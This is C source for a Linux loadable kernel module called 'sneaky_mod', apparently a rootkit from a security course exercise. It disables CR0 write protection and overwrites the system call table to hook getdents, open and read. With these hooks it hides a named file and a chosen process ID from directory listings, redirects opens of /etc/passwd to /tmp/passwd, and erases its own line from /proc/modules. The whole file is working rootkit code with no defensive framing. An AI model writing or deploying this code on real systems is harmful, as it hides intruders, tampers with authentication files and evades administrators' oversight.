#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <asm/uaccess.h>
#include <asm/unistd.h> 
#include <asm/page.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include <linux/highmem.h>
#include <asm/current.h>      
#include <linux/sched.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

#define HIDDEN "sneaky_process"

//These are function pointers to the system calls that change page
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81059d90;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81059df0;

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[256];
};


// /proc/modules file descriptor
static int fd_modules = -1;


//This is a pointer to the system call table in memory
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81801400;

//This is used for  system calls.
static asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
static asmlinkage int (*original_open)(const char *pathname, int flags);
static asmlinkage ssize_t (*original_read)(int fd, char *buf, size_t count);

//get parent process id
static long int process_id = 0;
module_param(process_id, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(process_id, "sneaky_process_id");


static asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    struct linux_dirent *p;
    mm_segment_t old_fs;
    char *buf, *userp;
    int ret, i, j;
    userp = (char *)dirp;
    buf = kmalloc(count, GFP_KERNEL);
    if (!buf) {
        return ENOBUFS;
    }
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    ret = original_getdents(fd, (struct linux_dirent *)buf, count);
    set_fs(old_fs);
    for (i = j = 0; i < ret; i += p->d_reclen) {
        p = (struct linux_dirent *) (buf + i);
        //skip sneaky_process
        if (strncmp(p->d_name, HIDDEN, sizeof(HIDDEN)) == 0) {
            continue;
        }
        char PID[256] = {'\0'};
        sprintf(PID, "%ld", process_id);
        if (strcmp(p->d_name, PID) == 0) {
            continue;
        }
        if (copy_to_user(userp + j, p, p->d_reclen)) {
            ret = EAGAIN;
            goto end;
        }
        j += p->d_reclen;
    }
    if (ret > 0) {
        ret = j;
    }
end:
    kfree(buf);
    return ret;
}
 

static asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
    int ret;
    const char *newPath = "/tmp/passwd";
    if (strcmp(pathname, "/etc/passwd") == 0) {
        if (copy_to_user(pathname, newPath, strlen(newPath) + 1)) {
            ret = EAGAIN;
            return original_open(pathname, flags);
        }
    }
    if (strcmp(pathname, "/proc/modules") == 0) {
        return (fd_modules = original_open(pathname, flags));
    }
    return original_open(pathname, flags);
}

static asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
    ssize_t ret;
    char *ptr1, *ptr2, *ptr3;
    char *delim = "\n";
    char *hide_module= "sneaky_mod";
    if (fd == fd_modules) {
        ret = original_read(fd, buf, count);
        if ((ptr2 = strstr(buf, hide_module)) != NULL) {
            //printk("buf size is %zu", strlen(buf));
            ptr1 = buf;
            ptr3 = ptr2;
            while (*ptr3 != *delim) {
                ptr3++;
            }
            ret -= (ssize_t)(ptr3 - ptr2);
            ssize_t copy_len = ptr1 + strlen(buf) - ptr3 - 1;
            ptr3++;
            int i;
            for (i = 0; i < copy_len; i++) {
                *ptr2++ = *ptr3++;
            }
            return ret;
        }
        else {
            return ret;
        }
    }
    else {
        return original_read(fd, buf ,count);
    }
}

static int init_sneaky_module(void) {
    struct page *page_ptr;
    //printk(KERN_INFO "sneaky_process_id is %ld\n", process_id);
    write_cr0(read_cr0() & (~0x10000));
    //get the pointer to the system call table
    page_ptr = virt_to_page(&sys_call_table);
    pages_rw(page_ptr, 1);
    //save original call and change it to sneaky call
    original_getdents = (void*)*(sys_call_table + __NR_getdents);
    *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
    original_open = (void*)*(sys_call_table + __NR_open);
    *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
    original_read = (void*)*(sys_call_table + __NR_read);
    *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
    //revert page to read only
    pages_ro(page_ptr, 1);
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

static void exit_sneaky_module(void) {
    struct page *page_ptr;
    //printk(KERN_INFO "sneaky module unloaded");
    write_cr0(read_cr0() & (~0x10000));
    page_ptr = virt_to_page(&sys_call_table);
    pages_rw(page_ptr, 1);
    *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
    *(sys_call_table + __NR_open) = (unsigned long)original_open;
    *(sys_call_table + __NR_read) = (unsigned long)original_read;
    pages_ro(page_ptr, 1);
    write_cr0(read_cr0() | 0x10000);

}

module_init(init_sneaky_module);
module_exit(exit_sneaky_module);
